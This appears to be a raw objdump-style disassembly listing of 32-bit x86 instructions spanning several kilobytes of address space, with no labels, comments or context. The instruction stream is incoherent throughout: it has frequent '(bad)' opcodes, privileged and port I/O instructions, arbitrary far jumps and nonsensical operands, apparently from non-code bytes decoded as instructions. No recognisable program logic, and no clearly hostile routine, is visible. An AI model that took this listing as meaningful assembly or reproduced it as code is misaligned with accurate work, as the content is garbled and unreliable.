  418a21:	pop    edi
  418a22:	call   0xbae8e25a
  418a27:	out    dx,al
  418a28:	mov    bl,0x73
  418a2a:	shr    DWORD PTR [eax-0x5414b8e7],1
  418a30:	push   es
  418a31:	mov    ch,0x82
  418a33:	adc    dh,BYTE PTR [ebx-0x6c2fed2d]
  418a39:	and    ch,bl
  418a3b:	inc    esi
  418a3c:	aam    0x62
  418a3e:	out    dx,al
  418a3f:	retf   0x1da0
  418a42:	fldcw  WORD PTR [ebx-0x7bcd422e]
  418a48:	lea    ebp,[ecx]
  418a4a:	or     eax,0xfa54783
  418a4f:	mov    bh,0x45
  418a51:	push   ecx
  418a52:	outs   dx,DWORD PTR ds:[esi]
  418a53:	ds sahf 
  418a55:	sub    eax,0x3f477294
  418a5a:	jge    0x418aaa
  418a5c:	sub    al,0x81
  418a5e:	or     eax,DWORD PTR [eax]
  418a60:	fistp  DWORD PTR [esi]
  418a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a63:	(bad)  
  418a64:	fimul  DWORD PTR [eax-0x16]
  418a67:	loop   0x418a37
  418a69:	and    al,0xa1
  418a6b:	dec    ebx
  418a6c:	adc    eax,0xaec8191f
  418a71:	fdivp  st(2),st
  418a73:	iret   
  418a74:	mov    esp,0xeed72c7
  418a79:	adc    dl,BYTE PTR [esi]
  418a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a7c:	jle    0x418ab6
  418a7e:	push   esp
  418a7f:	daa    
  418a80:	fiadd  WORD PTR [ecx]
  418a82:	pop    ds
  418a83:	xchg   esi,eax
  418a84:	mov    al,ds:0xcec9fe3a
  418a89:	sbb    eax,DWORD PTR [esi]
  418a8b:	inc    eax
  418a8c:	fidivr DWORD PTR [ecx+ebx*1]
  418a8f:	mov    ds:0xe5d8bf33,al
  418a94:	pop    esp
  418a95:	sub    al,0x99
  418a97:	div    BYTE PTR [edx-0x54a9771]
  418a9d:	and    BYTE PTR [eax-0x3f],al
  418aa0:	stc    
  418aa1:	push   es
  418aa2:	xor    BYTE PTR [edx],0x3c
  418aa5:	int3   
  418aa6:	adc    al,0x65
  418aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa9:	jne    0x418ad1
  418aab:	ret    0xb2e4
  418aae:	mov    eax,0x828236dd
  418ab3:	(bad)  
  418ab4:	cld    
  418ab5:	xchg   BYTE PTR [ebp+ebx*8+0x5a],al
  418ab9:	lods   al,BYTE PTR ds:[esi]
  418aba:	sbb    ecx,DWORD PTR [ecx]
  418abc:	xor    al,dh
  418abe:	cmp    DWORD PTR [edx],edi
  418ac0:	xor    edi,DWORD PTR [esi-0x54]
  418ac3:	adc    eax,0x9d565821
  418ac8:	fmul   DWORD PTR [edx+0x15bdde20]
  418ace:	(bad)  
  418acf:	push   ebp
  418ad0:	fwait
  418ad1:	sbb    DWORD PTR [ebx],edx
  418ad3:	mov    ah,0xd
  418ad5:	xchg   BYTE PTR [edx+0x6ca2eff7],dl
  418adb:	lock inc ebp
  418add:	cmp    eax,0x3e37cda0
  418ae2:	mov    ebx,ebp
  418ae4:	push   ds
  418ae5:	sub    al,0x93
  418ae7:	jb     0x418afd
  418ae9:	pop    ebx
  418aea:	pop    esp
  418aeb:	jl     0x418aff
  418aed:	shr    BYTE PTR [ebx-0x7b8190ed],1
  418af3:	dec    esi
  418af4:	cmp    dl,bl
  418af6:	or     DWORD PTR [esp+edi*1],edx
  418af9:	loopne 0x418abd
  418afb:	(bad)  
  418afc:	mov    eax,ds:0x6715ace8
  418b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b02:	out    0x64,eax
  418b04:	stos   DWORD PTR es:[edi],eax
  418b05:	ret    0xabb3
  418b08:	and    bl,dh
  418b0a:	test   DWORD PTR [ebp+0x6a],0xf0e8b1e
  418b11:	jp     0x418b11
  418b13:	repz sub DWORD PTR [edi],esp
  418b16:	(bad)  
  418b17:	hlt    
  418b18:	fs scas al,BYTE PTR es:[edi]
  418b1a:	mov    al,ds:0x1c38712
  418b1f:	sti    
  418b20:	(bad)  
  418b22:	xor    eax,DWORD PTR [eax+eiz*1]
  418b25:	into   
  418b26:	push   ecx
  418b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b28:	and    DWORD PTR [eax-0x30834ee4],0xffffffa2
  418b2f:	push   ebx
  418b30:	popa   
  418b31:	jmp    0x9efa:0xbdd86652
  418b38:	aam    0xda
  418b3a:	mov    ds:0x2be7ad4,eax
  418b3f:	outs   dx,BYTE PTR ds:[esi]
  418b40:	loope  0x418b31
  418b42:	test   dh,dh
  418b44:	loopne 0x418b19
  418b46:	mov    edi,0x261a452f
  418b4b:	add    BYTE PTR [edx+esi*2+0x29],dh
  418b4f:	xor    DWORD PTR [esi-0x58],ebx
  418b52:	push   edi
  418b53:	push   ss
  418b54:	jl     0x418bab
  418b56:	mov    DWORD PTR [edx-0x704bf1f7],ecx
  418b5c:	add    cl,BYTE PTR [ebx+0x64e5f6c3]
  418b62:	inc    edx
  418b63:	pop    eax
  418b64:	popa   
  418b65:	pop    ebx
  418b66:	cmp    BYTE PTR [ecx+edi*4],al
  418b69:	pop    eax
  418b6a:	shr    DWORD PTR ss:[ecx+0x19],cl
  418b6e:	adc    DWORD PTR [ecx+0xa],0xcf09920
  418b75:	sbb    DWORD PTR [ecx],edi
  418b77:	cwde   
  418b78:	inc    ebp
  418b79:	mov    dh,0xff
  418b7b:	mov    ds:0x28b4971,eax
  418b80:	dec    ecx
  418b81:	sahf   
  418b82:	sbb    DWORD PTR [esi+0x73],edi
  418b85:	add    edi,DWORD PTR [ebx-0x6c]
  418b88:	jae    0x418b97
  418b8a:	retf   
  418b8b:	lods   eax,DWORD PTR ds:[esi]
  418b8c:	mov    eax,DWORD PTR [edx-0x52]
  418b8f:	add    BYTE PTR [eax+eax*2],0x4
  418b93:	inc    edx
  418b94:	push   edi
  418b95:	in     al,dx
  418b96:	inc    edx
  418b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b98:	push   ebx
  418b99:	call   0x3e61:0x8b61423c
  418ba0:	rcl    DWORD PTR [ebp+ebx*1-0x18e7aa2],cl
  418ba7:	inc    esi
  418ba8:	mov    gs,edx
  418baa:	sub    eax,DWORD PTR [edx]
  418bac:	cwde   
  418bad:	les    edx,FWORD PTR [ebp+0x54]
  418bb0:	gs push esi
  418bb2:	outs   dx,DWORD PTR ds:[esi]
  418bb3:	sub    DWORD PTR [eax-0x6c],esp
  418bb6:	xor    dl,BYTE PTR [esi]
  418bb8:	ret    0xf22d
  418bbb:	aad    0x3a
  418bbd:	ins    BYTE PTR es:[edi],dx
  418bbe:	js     0x418b53
  418bc0:	mov    edi,0x746d38c
  418bc5:	or     DWORD PTR [ecx-0x5f1827e0],edi
  418bcb:	out    dx,al
  418bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bcd:	scas   eax,DWORD PTR es:[edi]
  418bce:	shl    DWORD PTR [edi+0x6a053e12],1
  418bd4:	mov    fs,ebp
  418bd6:	mov    dh,0x8e
  418bd8:	jg     0x418b65
  418bda:	sbb    BYTE PTR [edx+eiz*4],cl
  418bdd:	mov    esi,0x7c3fb658
  418be2:	jno    0x418bc9
  418be4:	jle    0x418bd3
  418be6:	mov    edx,0xc1888892
  418beb:	hlt    
  418bec:	or     BYTE PTR [edx],0x21
  418bef:	fcmovne st,st(3)
  418bf1:	mov    ebp,0xf4ab57b7
  418bf6:	enter  0x77b,0xc6
  418bfa:	and    ah,al
  418bfc:	dec    edx
  418bfd:	ret    0x8e63
  418c00:	xor    al,0xf8
  418c02:	add    ch,BYTE PTR [ebx+0x14]
  418c05:	mov    eax,0x47d58109
  418c0a:	push   cs
  418c0b:	push   ss
  418c0c:	push   ebx
  418c0d:	add    edi,edi
  418c0f:	call   0x66be208
  418c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c15:	nop
  418c16:	pusha  
  418c17:	inc    esp
  418c18:	mov    bl,0x8
  418c1a:	ror    DWORD PTR [ecx+0x6],0x75
  418c1e:	(bad)
  418c21:	jae    0x418c62
  418c23:	scas   al,BYTE PTR es:[edi]
  418c24:	mov    ah,0x8e
  418c26:	sub    ebp,DWORD PTR [ecx+eiz*4+0x3f]
  418c2a:	(bad)  
  418c2b:	or     eax,0x7fffe78c
  418c30:	and    eax,0xb13a509b
  418c35:	add    DWORD PTR [ecx-0xdadb4c],esi
  418c3b:	and    al,0x66
  418c3d:	ror    BYTE PTR [ebx+0x2c],0x0
  418c41:	adc    al,0xb2
  418c43:	adc    al,0xad
  418c45:	in     eax,0x4b
  418c47:	icebp  
  418c48:	jmp    0x7b72:0x4690ae80
  418c4f:	aas    
  418c50:	aaa    
  418c51:	stc    
  418c52:	loop   0x418c5d
  418c54:	std    
  418c55:	inc    edx
  418c56:	aaa    
  418c57:	shl    bh,1
  418c59:	out    dx,eax
  418c5a:	nop
  418c5b:	(bad)  
  418c5c:	cli    
  418c5d:	ror    DWORD PTR [ecx-0x5e],1
  418c60:	push   cs
  418c61:	(bad)  
  418c63:	imul   ebx,DWORD PTR [edx],0x8c8faec6
  418c69:	lds    esp,FWORD PTR [ecx-0x75]
  418c6c:	mov    al,ds:0x135195af
  418c71:	mov    dh,0x8
  418c73:	in     al,0xf3
  418c75:	out    0xa1,al
  418c77:	mov    dl,0xeb
  418c79:	adc    eax,0x932606b5
  418c7e:	jmp    0x2027:0xa062183
  418c85:	retf   0xf567
  418c88:	clc    
  418c89:	cmc    
  418c8a:	mov    esp,ecx
  418c8c:	imul   esi,DWORD PTR [ebx],0xffffffdc
  418c8f:	add    BYTE PTR [esi],dl
  418c91:	hlt    
  418c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c93:	dec    esp
  418c94:	mov    DWORD PTR [eax],0x0
	...
  418d12:	add    BYTE PTR [eax],al
  418d14:	jecxz  0x418d35
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	adc    al,0xfe
  418d19:	mov    ebp,0x9faffff3
  418d1e:	test   ah,0x6
  418d21:	xor    DWORD PTR [eax+ecx*1+0x34],0x2e
  418d26:	add    DWORD PTR [eax],eax
  418d28:	imul   eax,DWORD PTR [edi],0x83400000
  418d2e:	jl     0x418cb8
  418d30:	xchg   edx,eax
  418d31:	call   0xd37e:0x32079a42
  418d38:	mov    edx,0x9f1f85f2
  418d3d:	jb     0x418daa
  418d3f:	xor    eax,0x2b4a030f
  418d44:	jmp    0x2520:0x21455a8c
  418d4b:	inc    edi
  418d4c:	ja     0x418dc3
  418d4e:	pop    eax
  418d4f:	mov    ah,dl
  418d51:	out    0xa1,al
  418d53:	sbb    BYTE PTR [edx-0x434058f4],dh
  418d59:	or     eax,ebx
  418d5b:	cmp    eax,0x790be46c
  418d60:	aaa    
  418d61:	ret    
  418d62:	cmp    DWORD PTR [ecx+eiz*2],ebx
  418d65:	clc    
  418d66:	jp     0x418dd6
  418d68:	aaa    
  418d69:	sbb    eax,esi
  418d6b:	pop    edx
  418d6c:	fld    DWORD PTR [edi+esi*2]
  418d6f:	stos   BYTE PTR es:[edi],al
  418d70:	pop    ebx
  418d71:	fsubrp st(5),st
  418d73:	push   ebp
  418d74:	or     ecx,DWORD PTR [eax-0xc]
  418d77:	inc    ebp
  418d78:	push   edi
  418d79:	aaa    
  418d7a:	mov    ch,0x5d
  418d7c:	sub    BYTE PTR [ebp-0x5eb71220],dh
  418d82:	add    DWORD PTR [ebx],eax
  418d84:	xchg   DWORD PTR [esi+edi*8],esi
  418d87:	push   esp
  418d88:	add    eax,0x7ea7ce22
  418d8d:	in     eax,dx
  418d8e:	xchg   ecx,eax
  418d8f:	xchg   BYTE PTR [ebp+0x27],cl
  418d92:	mov    ah,0x9a
  418d94:	imul   edx,ebx,0x21
  418d97:	(bad)  
  418d99:	inc    esi
  418d9a:	out    0x3a,eax
  418d9c:	les    ecx,FWORD PTR [ebp+0x781f9d68]
  418da2:	arpl   WORD PTR [ebx+ebp*8+0x1e9a7b4d],ax
  418da9:	scas   eax,DWORD PTR es:[edi]
  418daa:	cs pop esp
  418dac:	jb     0x418df0
  418dae:	call   0xd549:0x93e3b49c
  418db5:	or     al,0x41
  418db7:	push   edx
  418db8:	stc    
  418db9:	out    dx,al
  418dba:	cmp    eax,0xb33d4ce2
  418dbf:	stc    
  418dc0:	(bad)  
  418dc2:	mov    ch,0x2f
  418dc4:	enter  0x5165,0x5f
  418dc8:	xor    eax,DWORD PTR [edx]
  418dca:	cmp    al,0x2d
  418dcc:	icebp  
  418dcd:	punpcklwd mm5,mm5
  418dd0:	dec    edi
  418dd1:	pop    ebp
  418dd2:	test   dl,cl
  418dd4:	cmc    
  418dd5:	ss mov dl,0xf1
  418dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd9:	mov    ?,WORD PTR ds:0x44d6af8f
  418ddf:	or     ecx,eax
  418de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de2:	imul   eax,ebx,0xf98275ae
  418de8:	dec    edi
  418de9:	add    BYTE PTR [eax],dh
  418deb:	mov    al,0xbf
  418ded:	ins    BYTE PTR es:[edi],dx
  418dee:	lods   al,BYTE PTR ds:[esi]
  418def:	ja     0x418dcf
  418df1:	dec    ecx
  418df2:	shl    BYTE PTR [edi],0xf3
  418df5:	in     eax,0x51
  418df7:	xchg   ebp,eax
  418df8:	mov    ds:0xc2057b93,al
  418dfd:	sub    DWORD PTR [ebp-0x28],esi
  418e00:	sbb    BYTE PTR [edi+edx*1],0x4d
  418e04:	and    BYTE PTR [ecx],ah
  418e06:	jecxz  0x418e26
  418e08:	sub    eax,0x84546fad
  418e0d:	stos   BYTE PTR es:[edi],al
  418e0e:	mov    ecx,0xbc43b1c6
  418e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e14:	dec    esi
  418e15:	rcr    al,cl
  418e17:	add    BYTE PTR [ecx],bh
  418e19:	in     eax,0xf7
  418e1b:	push   0x304631f3
  418e20:	mov    bl,0x64
  418e22:	cmc    
  418e23:	(bad)
  418e28:	xchg   esp,ecx
  418e2a:	mov    bh,0xc4
  418e2c:	fisttp QWORD PTR [ecx-0x44]
  418e2f:	xor    DWORD PTR [ebx],ecx
  418e31:	jo     0x418eb1
  418e33:	adc    BYTE PTR [edx+0x1b19ade7],al
  418e39:	std    
  418e3a:	fdivr  st,st(5)
  418e3c:	push   esi
  418e3d:	jmp    0xd9edb8a2
  418e42:	xchg   edi,eax
  418e43:	sub    DWORD PTR [esi+0x350ba339],edi
  418e49:	addr16 ds mov bh,0x67
  418e4d:	mov    edx,0x1512e862
  418e52:	dec    esp
  418e53:	stc    
  418e54:	imul   ecx,ebx,0x2ce4f79b
  418e5a:	mov    ch,0x8a
  418e5c:	cli    
  418e5d:	add    DWORD PTR [edi-0x2],ebx
  418e60:	ret    
  418e61:	adc    BYTE PTR [ebx*2+0x2f6d698b],dh
  418e68:	xchg   BYTE PTR [edi],ch
  418e6a:	inc    ecx
  418e6b:	xor    eax,0x27f6d56e
  418e70:	mov    edi,0xc0937ead
  418e75:	sub    eax,DWORD PTR [ebx+0xda23bd5]
  418e7b:	push   ebp
  418e7c:	cmc    
  418e7d:	sub    ah,BYTE PTR ds:0x1bd6b728
  418e83:	js     0x418ecd
  418e85:	test   BYTE PTR [ebp+0x725526a3],bl
  418e8b:	stc    
  418e8c:	mov    al,ds:0xf0bc25be
  418e91:	inc    esp
  418e92:	sti    
  418e93:	addr16 push ebp
  418e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e96:	stos   BYTE PTR es:[edi],al
  418e97:	sar    bh,1
  418e99:	es or  eax,0x49d48acf
  418e9f:	fbld   TBYTE PTR [edx]
  418ea1:	mov    ds:0x9297a1a3,al
  418ea6:	jmp    0x5ddd:0xc7dd73e4
  418ead:	cli    
  418eae:	loopne 0x418eb4
  418eb0:	dec    eax
  418eb1:	inc    esp
  418eb2:	and    BYTE PTR cs:[eax+eiz*1+0x464c0d3d],cl
  418eba:	sub    BYTE PTR [edx-0x2fd36992],dh
  418ec0:	test   al,0x47
  418ec2:	(bad)  
  418ec3:	mov    ch,0xa5
  418ec5:	dec    eax
  418ec6:	test   BYTE PTR [edi-0x6b],cl
  418ec9:	fs push esi
  418ecb:	sahf   
  418ecc:	inc    eax
  418ecd:	sar    BYTE PTR [esi],0x6f
  418ed0:	push   0xffffff96
  418ed2:	mov    bl,ah
  418ed4:	add    eax,0x5d5cd55b
  418ed9:	arpl   WORD PTR [ebp+0x6642c922],cx
  418edf:	iret   
  418ee0:	ret    
  418ee1:	mov    esi,DWORD PTR [ecx]
  418ee3:	mov    eax,0xf58665b5
  418ee8:	jbe    0x418f65
  418eea:	dec    esi
  418eeb:	adc    edi,ecx
  418eed:	nop
  418eee:	mov    ecx,0xf8465c29
  418ef3:	pop    ss
  418ef4:	loopne 0x418f3f
  418ef6:	into   
  418ef7:	mov    BYTE PTR [ebx-0x6621d256],0xae
  418efe:	gs mov edx,0xe22c9c69
  418f04:	(bad)  
  418f05:	cwde   
  418f06:	inc    edi
  418f07:	mov    dh,ah
  418f09:	in     eax,0x9
  418f0b:	push   ecx
  418f0c:	and    bh,BYTE PTR [esi+esi*1-0x5fb3bef0]
  418f13:	or     bh,BYTE PTR [esp+edi*1-0x1ef0d7c6]
  418f1a:	mov    dl,BYTE PTR [ecx-0x25]
  418f1d:	fidiv  DWORD PTR [edx]
  418f1f:	out    0x6b,eax
  418f21:	(bad)  
  418f22:	xchg   esi,eax
  418f23:	and    ah,BYTE PTR [ecx+0x41]
  418f26:	ret    
  418f27:	cmovp  edx,DWORD PTR [ecx+0x2a8d375b]
  418f2e:	jns    0x418f1b
  418f30:	jbe    0x418f99
  418f32:	ficomp WORD PTR ss:[edx+ecx*8-0x3818a784]
  418f3a:	pop    ecx
  418f3b:	mov    bh,BYTE PTR [esi-0x7]
  418f3e:	lods   eax,DWORD PTR ds:[esi]
  418f3f:	les    esi,FWORD PTR [ebx]
  418f41:	test   eax,0xb9e438c9
  418f46:	jae    0x418fab
  418f48:	scas   eax,DWORD PTR es:[edi]
  418f49:	cmp    eax,0xeb189f2c
  418f4e:	pop    ss
  418f4f:	jle    0x418f31
  418f51:	js     0x418f89
  418f53:	jge    0x418ed9
  418f55:	sbb    esp,esi
  418f57:	sub    cl,ch
  418f59:	aas    
  418f5a:	(bad)  
  418f5b:	popf   
  418f5c:	xchg   edi,eax
  418f5d:	scas   eax,DWORD PTR es:[edi]
  418f5e:	in     eax,0x80
  418f60:	pop    ecx
  418f61:	out    0xbc,eax
  418f63:	cli    
  418f64:	das    
  418f65:	fisub  WORD PTR [eax+0x31cba438]
  418f6b:	or     eax,0x303ec2f5
  418f70:	les    esp,FWORD PTR [eax+0x3a]
  418f73:	ror    BYTE PTR [edx+eiz*2+0x24],0xd
  418f78:	scas   al,BYTE PTR es:[edi]
  418f79:	add    DWORD PTR [edx],0x8
  418f7c:	loopne 0x418f8f
  418f7e:	mov    eax,DWORD PTR [ecx+0x63]
  418f81:	push   ecx
  418f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f83:	mov    ds:0x5414c280,eax
  418f88:	mov    ecx,edi
  418f8a:	clc    
  418f8b:	iret   
  418f8c:	sub    bh,al
  418f8e:	enter  0x14c4,0x42
  418f92:	mov    ch,0x3e
  418f94:	out    dx,eax
  418f95:	sbb    eax,0x10e2fa05
  418f9a:	inc    ebx
  418f9b:	xor    DWORD PTR [edx+edx*4-0x7f157205],ebp
  418fa2:	loop   0x418f68
  418fa4:	dec    edx
  418fa5:	lods   al,BYTE PTR ds:[esi]
  418fa6:	pop    es
  418fa7:	jmp    0x1fc7:0x7949d8c6
  418fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418faf:	mov    BYTE PTR [ecx],bh
  418fb1:	enter  0x817a,0xaa
  418fb5:	xchg   esp,eax
  418fb6:	cdq    
  418fb7:	xlat   BYTE PTR ds:[ebx]
  418fb8:	cli    
  418fb9:	imul   edx,ebx,0x27e02b94
  418fbf:	push   eax
  418fc0:	test   DWORD PTR [edi+0x627471d5],edi
  418fc6:	shl    bl,0x65
  418fc9:	iret   
  418fca:	jmp    0x419037
  418fcc:	fcomip st,st(3)
  418fce:	or     al,0xdb
  418fd0:	fisub  DWORD PTR ds:0x299a2619
  418fd6:	sahf   
  418fd7:	push   ebx
  418fd8:	inc    ecx
  418fd9:	cmp    DWORD PTR [eax],ebx
  418fdb:	dec    ebx
  418fdc:	cli    
  418fdd:	pop    ebx
  418fde:	pop    esi
  418fdf:	jbe    0x418ff6
  418fe1:	retf   0xf1e9
  418fe4:	cwde   
  418fe5:	pushf  
  418fe6:	xor    al,ch
  418fe8:	dec    esp
  418fe9:	jmp    0xc326:0xb18e4975
  418ff0:	fstp   st(2)
  418ff2:	out    dx,eax
  418ff3:	dec    esp
  418ff4:	pop    eax
  418ff5:	adc    eax,0xe63cd34d
  418ffa:	fdivr  DWORD PTR [edi+0x31bc7882]
  419000:	inc    esi
  419001:	jmp    0x418fc9
  419003:	bound  eax,QWORD PTR [ebp-0x6cb75a81]
  419009:	dec    edi
  41900a:	xchg   ebx,eax
  41900b:	aam    0xcb
  41900d:	in     eax,0xcf
  41900f:	add    eax,0x6bcd3689
  419014:	je     0x418ff3
  419016:	lds    esi,FWORD PTR [ebp-0x2e6cb335]
  41901c:	cld    
  41901d:	add    ebx,esp
  41901f:	shl    DWORD PTR [ecx+eax*1+0x54],cl
  419023:	ja     0x41908e
  419025:	aaa    
  419026:	or     BYTE PTR [esi+0x7b27ae83],dl
  41902c:	inc    esp
  41902d:	lods   eax,DWORD PTR ds:[esi]
  41902e:	add    DWORD PTR [ecx+0x79],eax
  419031:	mov    DWORD PTR [ebp+0x32],ebp
  419034:	jecxz  0x419018
  419036:	mov    WORD PTR es:[edx],es
  419039:	mov    ebx,0x73fdf915
  41903e:	shl    dh,cl
  419040:	mov    ecx,esp
  419042:	test   al,0xc4
  419045:	test   al,0x8a
  419047:	cmp    bl,BYTE PTR [esi+0x1f]
  41904a:	xchg   di,ax
  41904c:	imul   eax,DWORD PTR [eax],0x51
  41904f:	sbb    eax,0xd56b62a6
  419054:	repz loope 0x418ffb
  419057:	adc    ebp,DWORD PTR [esi-0x1e274205]
  41905d:	aad    0x4c
  41905f:	dec    ebp
  419060:	mov    dh,BYTE PTR [ebx]
  419062:	or     dl,BYTE PTR [esi-0x716335ec]
  419068:	test   ch,bl
  41906a:	enter  0x7703,0x6b
  41906e:	int    0x7
  419070:	js     0x4190c2
  419072:	into   
  419073:	nop
  419074:	dec    edi
  419075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419076:	out    0xae,eax
  419078:	or     BYTE PTR [ecx+0x50e6d0b5],dl
  41907e:	jno    0x4190f7
  419080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419081:	dec    ebp
  419082:	rcr    ah,cl
  419084:	push   ecx
  419085:	fadd   QWORD PTR [esi-0x58acf907]
  41908b:	xor    edx,esp
  41908d:	lds    ecx,FWORD PTR [esi]
  41908f:	ror    BYTE PTR [ebx-0x12],0x78
  419093:	xchg   ecx,eax
  419094:	add    bl,bh
  419096:	sub    dl,BYTE PTR [esi-0x7e]
  419099:	cdq    
  41909a:	hlt    
  41909b:	js     0x419113
  41909d:	pushf  
  41909e:	pop    ebx
  41909f:	push   0xef291f56
  4190a4:	mov    ecx,DWORD PTR [eax-0x43]
  4190a7:	mov    ebp,0xa48c3e8b
  4190ac:	xchg   ecx,eax
  4190ad:	dec    edi
  4190ae:	cmc    
  4190af:	or     DWORD PTR [edi+esi*1+0x15],esp
  4190b3:	xor    cl,BYTE PTR [esi-0x1c96f6f8]
  4190b9:	dec    edx
  4190ba:	std    
  4190bb:	cld    
  4190bc:	sub    DWORD PTR [esp+esi*2-0x123ed5d3],ebp
  4190c3:	sbb    BYTE PTR [esi+ecx*1+0x7c],ch
  4190c7:	sbb    al,0xfb
  4190c9:	loope  0x419069
  4190cb:	ret    0xd199
  4190ce:	or     eax,0x101e1c3a
  4190d3:	sub    al,0x30
  4190d5:	mov    cl,0xa4
  4190d7:	cmp    cl,ah
  4190d9:	sbb    ch,BYTE PTR [ebx+0x1b037fb4]
  4190df:	sbb    DWORD PTR [ecx],0xb9fdd434
  4190e5:	mov    ebp,0xb5c7a383
  4190ea:	out    0x99,al
  4190ec:	das    
  4190ed:	xor    esp,0xf0204172
  4190f3:	aas    
  4190f4:	(bad)  
  4190f5:	mov    al,0x29
  4190f7:	mov    cs,WORD PTR [ebx+0x2497506c]
  4190fd:	test   eax,0xf0d5b968
  419102:	add    eax,0x3fef4189
  419107:	in     al,dx
  419108:	and    DWORD PTR [esi+0x0],0xab717dc5
  41910f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419110:	bound  ebx,QWORD PTR [ebx+0x22]
  419113:	fst    DWORD PTR [ebx]
  419115:	loopne 0x419122
  419117:	lea    ebx,[edx+0xe]
  41911a:	mov    esi,0x502646d0
  41911f:	push   edx
  419120:	je     0x4190c0
  419122:	out    dx,eax
  419123:	fst    DWORD PTR [ebp+0xc]
  419126:	jecxz  0x41910e
  419128:	in     eax,0xff
  41912a:	mov    ch,0x45
  41912c:	repnz pusha 
  41912e:	idiv   DWORD PTR [edx+ecx*8+0xf]
  419132:	or     DWORD PTR [esi],esi
  419134:	mov    dh,0x77
  419136:	xchg   DWORD PTR [esp+edx*2+0x28],esp
  41913a:	sti    
  41913b:	(bad)  
  41913c:	ja     0x4190c3
  41913e:	js     0x419172
  419140:	int3   
  419141:	push   cs
  419142:	add    ecx,0x85a723
  419148:	xchg   ecx,eax
  419149:	push   edx
  41914a:	adc    eax,0x9a2719e2
  41914f:	loope  0x41913b
  419151:	in     al,dx
  419152:	fisubr DWORD PTR [eax+0x3a]
  419155:	jno    0x419134
  419157:	lahf   
  419158:	cmp    bh,BYTE PTR [esp+edx*2-0x150d1107]
  41915f:	mov    al,BYTE PTR [esi]
  419161:	shr    esp,0x8
  419164:	mov    dl,0x44
  419166:	xchg   BYTE PTR [ebx],cl
  419168:	sbb    eax,0x12100b12
  41916d:	jl     0x41913f
  41916f:	cmp    eax,0xe9eace6
  419174:	dec    esi
  419175:	jecxz  0x419151
  419177:	clc    
  419178:	icebp  
  419179:	repz jbe 0x4191b3
  41917c:	push   0xade76778
  419181:	cmp    al,0x52
  419183:	mov    eax,ds:0x82ee9aa4
  419188:	or     al,0xfd
  41918a:	push   edx
  41918b:	ret    
  41918c:	lods   eax,DWORD PTR ds:[esi]
  41918d:	fdivr  DWORD PTR [esi+0x33]
  419190:	jns    0x419201
  419192:	mov    DWORD PTR [edi],ecx
  419194:	jns    0x4191ba
  419196:	mov    ecx,0x99219a8c
  41919b:	fcomp  QWORD PTR [ebx]
  41919d:	mov    edi,0x21547c3d
  4191a2:	xchg   ebp,eax
  4191a3:	mov    es,ebp
  4191a5:	popa   
  4191a6:	lods   al,BYTE PTR ds:[esi]
  4191a7:	fmul   DWORD PTR [eax-0x7a60e0a4]
  4191ad:	das    
  4191ae:	sbb    al,0xa7
  4191b0:	pop    esi
  4191b1:	inc    ecx
  4191b2:	xor    bl,BYTE PTR [eax+ebp*4-0x38977a77]
  4191b9:	push   edi
  4191ba:	sbb    DWORD PTR [ecx-0x3dc0938c],0xffffffcc
  4191c1:	daa    
  4191c2:	cmp    esi,DWORD PTR [ecx]
  4191c4:	add    al,0xf4
  4191c6:	idiv   ecx
  4191c8:	out    0x96,eax
  4191ca:	jbe    0x4191e3
  4191cc:	xor    eax,0x8f13ff7b
  4191d1:	retf   0x4475
  4191d4:	inc    esp
  4191d5:	iret   
  4191d6:	repz ss es test bh,ah
  4191db:	arpl   WORD PTR [edi+0x23644046],bp
  4191e1:	sub    DWORD PTR [eax+0xb],esp
  4191e4:	int    0xb5
  4191e6:	imul   esp,DWORD PTR [ebp+0x56e5bca8],0xffffffd0
  4191ed:	push   0x5b
  4191ef:	les    edi,FWORD PTR [edi]
  4191f1:	aam    0x55
  4191f3:	and    al,0x2b
  4191f5:	adc    eax,0x8312e2e1
  4191fa:	sub    ah,BYTE PTR [edi]
  4191fc:	sahf   
  4191fd:	das    
  4191fe:	push   ecx
  4191ff:	retf   0x8382
  419202:	sbb    bl,BYTE PTR [ecx-0x3a6b1472]
  419208:	clc    
  419209:	and    BYTE PTR [ecx-0x304eced9],bh
  41920f:	cld    
  419210:	xchg   ebp,eax
  419211:	scas   eax,DWORD PTR es:[edi]
  419212:	and    BYTE PTR [eax+eiz*1+0x18],dl
  419216:	sbb    eax,0x6903f899
  41921b:	rcl    edi,1
  41921d:	je     0x419250
  41921f:	or     eax,0xa8379fd0
  419224:	out    0x40,eax
  419226:	and    esp,DWORD PTR [ecx-0x27]
  419229:	sbb    BYTE PTR [ecx],dh
  41922b:	adc    ah,BYTE PTR [esi+0x1b8a8fd4]
  419231:	and    dh,BYTE PTR [edi]
  419233:	popa   
  419234:	fsub   DWORD PTR [esi-0x68]
  419237:	cwde   
  419238:	jp     0x419222
  41923a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41923b:	sbb    dh,BYTE PTR [eax-0x6ca2b4a6]
  419241:	mov    WORD PTR [esi-0x59799a],es
  419247:	jae    0x419204
  419249:	mov    ds:0x6d66726a,al
  41924e:	adc    eax,0xa824348b
  419253:	outs   dx,BYTE PTR ds:[esi]
  419254:	mov    ds:0xe35ec6fe,al
  419259:	jmp    0x6c92449f
  41925e:	mov    ah,0x63
  419260:	add    eax,0x999defd5
  419265:	xor    ax,0xa21c
